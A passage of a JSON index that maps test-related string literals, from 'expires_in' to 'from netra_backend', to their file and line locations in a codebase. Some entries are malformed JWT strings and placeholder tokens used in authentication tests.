        "auth_service/tests/utils/assertion_helpers.py:124"
      ]
    },
    "expires_in": {
      "value": "expires_in",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:196",
        "auth_service/tests/integration/test_auth_oauth_errors.py:49",
        "auth_service/tests/integration/test_auth_oauth_google.py:58",
        "auth_service/tests/integration/test_auth_oauth_google.py:193",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:132",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:818",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:875",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:30",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:49",
        "auth_service/tests/integration/test_oauth_flows_sync.py:160"
      ]
    },
    "exponential": {
      "value": "exponential",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:139",
        "netra_backend/app/services/realistic_test_data/models.py:73"
      ]
    },
    "exponential_spread": {
      "value": "exponential_spread",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:93"
      ]
    },
    "external_services": {
      "value": "external_services",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:49"
      ]
    },
    "extract-user": {
      "value": "extract-user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:356",
        "auth_service/tests/unified/test_jwt_validation.py:360"
      ]
    },
    "extract@netrasystems.ai": {
      "value": "extract@netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:356"
      ]
    },
    "extract_utilities": {
      "value": "extract_utilities",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:579",
        "scripts/compliance/test_refactor_helper.py:632"
      ]
    },
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature": {
      "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1037"
      ]
    },
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.malformed": {
      "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.malformed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:144"
      ]
    },
    "eyJhbGciOiJIUzI1NiJ9.": {
      "value": "eyJhbGciOiJIUzI1NiJ9.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:630"
      ]
    },
    "f": {
      "value": "f",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:62",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:71"
      ]
    },
    "fail_fast": {
      "value": "fail_fast",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:98",
        "scripts/unified_test_config.py:195",
        "scripts/unified_test_config.py:202",
        "scripts/unified_test_config.py:209",
        "scripts/unified_test_config.py:216",
        "scripts/unified_test_config.py:376"
      ]
    },
    "fail_fast_enabled": {
      "value": "fail_fast_enabled",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:170"
      ]
    },
    "fail_fast_threshold": {
      "value": "fail_fast_threshold",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:180",
        "scripts/test_backend_optimized.py:187",
        "scripts/test_backend_optimized.py:194"
      ]
    },
    "failed": {
      "value": "failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:456",
        "scripts/batch_fix_and_test.py:143",
        "scripts/comprehensive_test_fixer.py:282",
        "scripts/comprehensive_test_fixer.py:332",
        "scripts/comprehensive_test_fixer.py:334",
        "scripts/comprehensive_test_fixer.py:337",
        "scripts/comprehensive_test_fixer.py:393",
        "scripts/comprehensive_test_fixer.py:423",
        "scripts/fix_test_batch.py:231",
        "scripts/fix_test_batch.py:250"
      ]
    },
    "failed to exchange authorization code": {
      "value": "failed to exchange authorization code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:310"
      ]
    },
    "failed:": {
      "value": "failed:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:191",
        "auth_service/tests/test_graceful_shutdown_failures.py:452",
        "scripts/test_auth_integration.py:55"
      ]
    },
    "failed_files": {
      "value": "failed_files",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:292",
        "scripts/fix_test_import_errors.py:312",
        "scripts/fix_test_import_errors.py:321",
        "scripts/fix_test_import_errors.py:322",
        "scripts/fix_test_import_errors.py:323"
      ]
    },
    "failed_requests": {
      "value": "failed_requests",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:265"
      ]
    },
    "failed_tests": {
      "value": "failed_tests",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:145",
        "scripts/test_failure_scanner.py:160"
      ]
    },
    "failing": {
      "value": "failing",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:234"
      ]
    },
    "failing tests": {
      "value": "failing tests",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:117"
      ]
    },
    "failing tests to process": {
      "value": "failing tests to process",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:300"
      ]
    },
    "failing tests** tracked in bad_tests.json": {
      "value": "failing tests** tracked in bad_tests.json",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:165"
      ]
    },
    "failing_agent": {
      "value": "failing_agent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:71"
      ]
    },
    "failing_tests": {
      "value": "failing_tests",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:116",
        "scripts/generate_test_audit.py:132",
        "scripts/generate_test_audit.py:164",
        "scripts/generate_test_audit.py:165"
      ]
    },
    "failure": {
      "value": "failure",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:350",
        "scripts/team_updates_test_analyzer.py:61"
      ]
    },
    "failure_rate": {
      "value": "failure_rate",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:196",
        "scripts/test_failure_scanner.py:226"
      ]
    },
    "failure_reason": {
      "value": "failure_reason",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:95"
      ]
    },
    "failure_scan.json": {
      "value": "failure_scan.json",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:349",
        "scripts/fix_test_batch.py:349",
        "scripts/test_failure_scanner.py:211"
      ]
    },
    "failure_start": {
      "value": "failure_start",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:89",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:114"
      ]
    },
    "failures": {
      "value": "failures",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:56",
        "scripts/team_updates_test_analyzer.py:90",
        "scripts/team_updates_test_analyzer.py:104",
        "scripts/team_updates_test_analyzer.py:116",
        "scripts/test_failure_scanner.py:159"
      ]
    },
    "failures_found": {
      "value": "failures_found",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:97",
        "scripts/iterative_test_fix_loop.py:111"
      ]
    },
    "fair": {
      "value": "fair",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:46"
      ]
    },
    "fake": {
      "value": "fake",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:238"
      ]
    },
    "fake tests found": {
      "value": "fake tests found",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:463"
      ]
    },
    "fake tests found in": {
      "value": "fake tests found in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:91"
      ]
    },
    "fake tests in": {
      "value": "fake tests in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:74"
      ]
    },
    "fake tests requiring attention": {
      "value": "fake tests requiring attention",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:444"
      ]
    },
    "fake tests, severity:": {
      "value": "fake tests, severity:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:286"
      ]
    },
    "fake_access_token": {
      "value": "fake_access_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:99"
      ]
    },
    "fake_oauth_token": {
      "value": "fake_oauth_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:241"
      ]
    },
    "fake_session_456": {
      "value": "fake_session_456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:114"
      ]
    },
    "fake_test_count": {
      "value": "fake_test_count",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:174",
        "scripts/compliance/fake_test_scanner.py:179",
        "scripts/compliance/fake_test_scanner.py:286"
      ]
    },
    "fake_tests": {
      "value": "fake_tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:164",
        "scripts/compliance/fake_test_scanner.py:168",
        "scripts/compliance/fake_test_scanner.py:174",
        "scripts/compliance/fake_test_scanner.py:239"
      ]
    },
    "fake_tests_by_directory": {
      "value": "fake_tests_by_directory",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:84"
      ]
    },
    "fake_tests_by_severity": {
      "value": "fake_tests_by_severity",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:86",
        "scripts/compliance/fake_test_scanner.py:117",
        "scripts/compliance/fake_test_scanner.py:263",
        "scripts/compliance/fake_test_scanner.py:266",
        "scripts/compliance/fake_test_scanner.py:418"
      ]
    },
    "fake_tests_by_type": {
      "value": "fake_tests_by_type",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:85",
        "scripts/compliance/fake_test_scanner.py:116",
        "scripts/compliance/fake_test_scanner.py:271",
        "scripts/compliance/fake_test_scanner.py:273",
        "scripts/compliance/fake_test_scanner.py:417"
      ]
    },
    "fake_token": {
      "value": "fake_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:83",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:92",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:103",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:137",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:146",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:155",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:175",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:192",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:203",
        "scripts/test_verify_workflow_status.py:122"
      ]
    },
    "fallback": {
      "value": "fallback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:153",
        "auth_service/tests/auth-service-down-critical-scenarios.py:407"
      ]
    },
    "fallback_mode": {
      "value": "fallback_mode",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:275"
      ]
    },
    "false": {
      "value": "false",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:58",
        "auth_service/tests/conftest.py:28",
        "auth_service/tests/test_critical_oauth_environment_failures.py:49",
        "auth_service/tests/test_critical_oauth_environment_failures.py:93",
        "auth_service/tests/test_critical_oauth_environment_failures.py:133",
        "auth_service/tests/test_critical_oauth_environment_failures.py:171",
        "auth_service/tests/test_critical_oauth_environment_failures.py:178",
        "auth_service/tests/test_critical_oauth_environment_failures.py:187",
        "auth_service/tests/test_critical_oauth_environment_failures.py:198",
        "auth_service/tests/test_critical_oauth_environment_failures.py:269"
      ]
    },
    "family_name": {
      "value": "family_name",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:47"
      ]
    },
    "fast": {
      "value": "fast",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:192"
      ]
    },
    "feature": {
      "value": "feature",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:506",
        "scripts/compliance/test_refactor_helper.py:679"
      ]
    },
    "feature_based": {
      "value": "feature_based",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:505"
      ]
    },
    "fernet-key": {
      "value": "fernet-key",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:142"
      ]
    },
    "fernet_key": {
      "value": "fernet_key",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:94",
        "scripts/test_staging_config.py:134"
      ]
    },
    "file": {
      "value": "file",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:64",
        "scripts/analyze_test_mocks.py:154",
        "scripts/analyze_test_mocks.py:177",
        "scripts/analyze_test_mocks.py:188",
        "scripts/analyze_test_mocks.py:188",
        "scripts/autonomous_review/test_reviewer.py:96",
        "scripts/autonomous_review/test_reviewer.py:104",
        "scripts/autonomous_review/test_reviewer.py:105",
        "scripts/business_value_test_index.py:640",
        "scripts/check_test_compliance.py:110"
      ]
    },
    "file=": {
      "value": "file=",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:100"
      ]
    },
    "file_analyses": {
      "value": "file_analyses",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:78",
        "scripts/compliance/test_size_validator.py:91",
        "scripts/compliance/test_size_validator.py:494"
      ]
    },
    "file_error": {
      "value": "file_error",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:147",
        "scripts/compliance/real_test_requirements_enforcer.py:179",
        "scripts/compliance/real_test_validator.py:102"
      ]
    },
    "file_fixes": {
      "value": "file_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:407"
      ]
    },
    "file_path": {
      "value": "file_path",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:633",
        "scripts/auto_fix_test_sizes.py:647",
        "scripts/auto_fix_test_sizes.py:673",
        "scripts/compliance/test_refactor_helper.py:99",
        "scripts/compliance/test_size_validator.py:440",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:488"
      ]
    },
    "file_path,line_number,violation_type,severity,description,recommended_action": {
      "value": "file_path,line_number,violation_type,severity,description,recommended_action",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:291",
        "scripts/remove_test_stubs.py:294"
      ]
    },
    "file_pattern": {
      "value": "file_pattern",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:245",
        "scripts/unified_test_config.py:250",
        "scripts/unified_test_config.py:255",
        "scripts/unified_test_config.py:260",
        "scripts/unified_test_config.py:265"
      ]
    },
    "file_size": {
      "value": "file_size",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:627",
        "scripts/auto_fix_test_violations.py:210",
        "scripts/auto_fix_test_violations.py:809",
        "scripts/auto_fix_test_violations.py:863",
        "scripts/auto_fix_test_violations.py:890",
        "scripts/compliance/project_test_validator.py:155",
        "scripts/compliance/real_test_linter.py:171",
        "scripts/compliance/real_test_requirements_enforcer.py:221",
        "scripts/compliance/real_test_requirements_enforcer.py:516",
        "scripts/compliance/real_test_validator.py:110"
      ]
    },
    "file_splits": {
      "value": "file_splits",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:199",
        "scripts/compliance/real_test_linter.py:202",
        "scripts/compliance/test_fixer.py:350",
        "scripts/compliance/test_fixer.py:361"
      ]
    },
    "file_system": {
      "value": "file_system",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:23",
        "scripts/analyze_test_mocks.py:65"
      ]
    },
    "files": {
      "value": "files",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:75",
        "scripts/auto_fix_test_violations.py:718",
        "scripts/auto_fix_test_violations.py:831",
        "scripts/business_value_test_index.py:554",
        "scripts/compliance/fake_test_scanner.py:74",
        "scripts/compliance/fake_test_scanner.py:91",
        "scripts/compliance/real_test_linter.py:137",
        "scripts/compliance/real_test_linter.py:264",
        "scripts/compliance/real_test_requirements_enforcer.py:493",
        "scripts/fix_test_import_order.py:108"
      ]
    },
    "files (already correct or no setup_test_path)": {
      "value": "files (already correct or no setup_test_path)",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:109"
      ]
    },
    "files (use --limit=N to change)": {
      "value": "files (use --limit=N to change)",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:261"
      ]
    },
    "files don't use setup_test_path": {
      "value": "files don't use setup_test_path",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:84"
      ]
    },
    "files fixed:": {
      "value": "files fixed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:97"
      ]
    },
    "files have correct import order": {
      "value": "files have correct import order",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:83"
      ]
    },
    "files have import order issues": {
      "value": "files have import order issues",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:85"
      ]
    },
    "files in priority order:": {
      "value": "files in priority order:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:266"
      ]
    },
    "files with issues": {
      "value": "files with issues",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:115"
      ]
    },
    "files with references:": {
      "value": "files with references:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:171"
      ]
    },
    "files with size violations addressed": {
      "value": "files with size violations addressed",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:268"
      ]
    },
    "files with syntax errors": {
      "value": "files with syntax errors",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:245",
        "scripts/fix_test_syntax_errors.py:245"
      ]
    },
    "files)": {
      "value": "files)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:521",
        "scripts/compliance/test_violations_reporter.py:75"
      ]
    },
    "files):": {
      "value": "files):",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:165",
        "scripts/check_test_compliance.py:173",
        "scripts/check_test_compliance.py:183",
        "scripts/fix_test_import_errors.py:315"
      ]
    },
    "files** in test_framework directory": {
      "value": "files** in test_framework directory",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:161"
      ]
    },
    "files, modified": {
      "value": "files, modified",
      "category": "test_literals",
      "locations": [
        "scripts/remove_duplicate_test_setup.py:63"
      ]
    },
    "files_affected": {
      "value": "files_affected",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:263",
        "scripts/remove_test_stubs.py:311"
      ]
    },
    "files_created": {
      "value": "files_created",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:694",
        "scripts/auto_fix_test_sizes.py:701"
      ]
    },
    "files_exceeding_300_lines": {
      "value": "files_exceeding_300_lines",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:133"
      ]
    },
    "files_exceeding_limit": {
      "value": "files_exceeding_limit",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:80",
        "scripts/compliance/test_size_validator.py:96",
        "scripts/compliance/test_size_validator.py:421",
        "scripts/compliance/test_size_validator.py:460"
      ]
    },
    "files_fixed": {
      "value": "files_fixed",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:289",
        "scripts/fix_test_import_errors.py:311"
      ]
    },
    "files_over_300": {
      "value": "files_over_300",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:90",
        "scripts/check_test_compliance.py:109",
        "scripts/check_test_compliance.py:133",
        "scripts/check_test_compliance.py:147",
        "scripts/check_test_compliance.py:164",
        "scripts/check_test_compliance.py:165",
        "scripts/check_test_compliance.py:166",
        "scripts/check_test_compliance.py:168",
        "scripts/check_test_compliance.py:169"
      ]
    },
    "files_processed": {
      "value": "files_processed",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:617",
        "scripts/auto_fix_test_sizes.py:657",
        "scripts/auto_fix_test_sizes.py:748"
      ]
    },
    "files_split": {
      "value": "files_split",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:618",
        "scripts/auto_fix_test_sizes.py:662",
        "scripts/auto_fix_test_sizes.py:749"
      ]
    },
    "files_with_errors": {
      "value": "files_with_errors",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:288",
        "scripts/fix_test_import_errors.py:310"
      ]
    },
    "files_with_long_functions": {
      "value": "files_with_long_functions",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:134"
      ]
    },
    "files_with_mock_components": {
      "value": "files_with_mock_components",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:135"
      ]
    },
    "find": {
      "value": "find",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:62",
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:68",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:65",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:71"
      ]
    },
    "finish_reason": {
      "value": "finish_reason",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:113"
      ]
    },
    "fintech": {
      "value": "fintech",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:25",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:256"
      ]
    },
    "first_failure": {
      "value": "first_failure",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:814"
      ]
    },
    "first_use": {
      "value": "first_use",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:309",
        "auth_service/tests/integration/test_redis_connection_failover.py:330"
      ]
    },
    "fix_applied": {
      "value": "fix_applied",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:264",
        "scripts/fix_test_batch.py:310"
      ]
    },
    "fix_attempted": {
      "value": "fix_attempted",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:98",
        "scripts/iterative_test_fix_loop.py:123"
      ]
    },
    "fix_command": {
      "value": "fix_command",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:99",
        "scripts/iterative_test_fix_loop.py:128"
      ]
    },
    "fix_delegated": {
      "value": "fix_delegated",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:129"
      ]
    },
    "fix_module_import": {
      "value": "fix_module_import",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:76"
      ]
    },
    "fix_needed": {
      "value": "fix_needed",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:33",
        "scripts/comprehensive_test_fixer.py:45",
        "scripts/comprehensive_test_fixer.py:57",
        "scripts/comprehensive_test_fixer.py:68",
        "scripts/comprehensive_test_fixer.py:317"
      ]
    },
    "fix_strategy": {
      "value": "fix_strategy",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:38",
        "scripts/fix_test_batch.py:49",
        "scripts/fix_test_batch.py:60",
        "scripts/fix_test_batch.py:66",
        "scripts/fix_test_batch.py:76",
        "scripts/fix_test_batch.py:80",
        "scripts/fix_test_batch.py:307"
      ]
    },
    "fix_suggestion": {
      "value": "fix_suggestion",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:443",
        "scripts/compliance/test_size_validator.py:479",
        "scripts/compliance/test_size_validator.py:488"
      ]
    },
    "fixed": {
      "value": "fixed",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:281",
        "scripts/comprehensive_test_fixer.py:311",
        "scripts/comprehensive_test_fixer.py:329",
        "scripts/comprehensive_test_fixer.py:392",
        "scripts/comprehensive_test_fixer.py:395",
        "scripts/comprehensive_test_fixer.py:396",
        "scripts/fix_test_batch.py:230",
        "scripts/fix_test_batch.py:248",
        "scripts/fix_test_batch.py:249",
        "scripts/fix_test_batch.py:309"
      ]
    },
    "fixes": {
      "value": "fixes",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:106"
      ]
    },
    "fixes_applied": {
      "value": "fixes_applied",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:144",
        "scripts/comprehensive_test_fixer.py:411",
        "scripts/fix_test_import_errors.py:291",
        "scripts/fix_test_import_errors.py:314",
        "scripts/fix_test_import_errors.py:315",
        "scripts/fix_test_import_errors.py:316"
      ]
    },
    "fixture": {
      "value": "fixture",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:190",
        "scripts/analyze_test_overlap.py:191",
        "scripts/auto_fix_test_sizes.py:183",
        "scripts/auto_fix_test_sizes.py:183",
        "scripts/auto_fix_test_violations.py:446",
        "scripts/auto_fix_test_violations.py:510",
        "scripts/compliance/test_refactor_helper.py:190",
        "scripts/compliance/test_refactor_helper.py:192",
        "scripts/compliance/test_refactor_helper.py:316",
        "scripts/compliance/test_refactor_helper.py:319"
      ]
    },
    "fixture_similarity": {
      "value": "fixture_similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:633"
      ]
    },
    "fixtures": {
      "value": "fixtures",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:272",
        "scripts/auto_fix_test_sizes.py:301",
        "scripts/compliance/demo_test_size_enforcement.py:91",
        "scripts/compliance/test_refactor_helper.py:103",
        "scripts/compliance/test_refactor_helper.py:709"
      ]
    },
    "fixtures.py": {
      "value": "fixtures.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:112",
        "scripts/compliance/real_test_validator.py:69"
      ]
    },
    "flaky": {
      "value": "flaky",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:111"
      ]
    },
    "flaky_tests": {
      "value": "flaky_tests",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:147",
        "scripts/team_updates_test_analyzer.py:157"
      ]
    },
    "flu_season": {
      "value": "flu_season",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:41"
      ]
    },
    "focused test functions or use helper methods": {
      "value": "focused test functions or use helper methods",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:157"
      ]
    },
    "focused test modules": {
      "value": "focused test modules",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:113",
        "scripts/compliance/test_size_validator.py:194"
      ]
    },
    "following backend pattern": {
      "value": "following backend pattern",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:70"
      ]
    },
    "for functions to implement": {
      "value": "for functions to implement",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:392"
      ]
    },
    "for input": {
      "value": "for input",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:318"
      ]
    },
    "for splitting opportunities...": {
      "value": "for splitting opportunities...",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:73"
      ]
    },
    "formatDuration formats time correctly": {
      "value": "formatDuration formats time correctly",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:31"
      ]
    },
    "formatLatency formats latency correctly": {
      "value": "formatLatency formats latency correctly",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:37"
      ]
    },
    "framework": {
      "value": "framework",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:32",
        "scripts/align_test_imports.py:74",
        "scripts/align_test_imports.py:75"
      ]
    },
    "fraud_detection": {
      "value": "fraud_detection",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:36",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:191"
      ]
    },
    "free": {
      "value": "free",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:107",
        "scripts/business_value_test_index.py:459"
      ]
    },
    "free|trial|basic|onboarding": {
      "value": "free|trial|basic|onboarding",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:107"
      ]
    },
    "from": {
      "value": "from",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:169",
        "scripts/auto_fix_test_violations.py:585",
        "scripts/compliance/test_fixer.py:192",
        "scripts/comprehensive_test_fixer.py:265",
        "scripts/fix_all_test_issues.py:44",
        "scripts/fix_all_test_issues.py:46",
        "scripts/fix_all_test_issues.py:140",
        "scripts/fix_test_batch.py:185",
        "scripts/fix_test_batch.py:185",
        "scripts/fix_test_import_errors.py:178"
      ]
    },
    "from .": {
      "value": "from .",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:579",
        "scripts/fix_all_test_issues.py:198"
      ]
    },
    "from app\\.": {
      "value": "from app\\.",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:194"
      ]
    },
    "from conftest import": {
      "value": "from conftest import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:200"
      ]
    },
    "from netra_backend": {
      "value": "from netra_backend",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:158",
        "scripts/fix_test_import_order.py:32"
      ]
    },
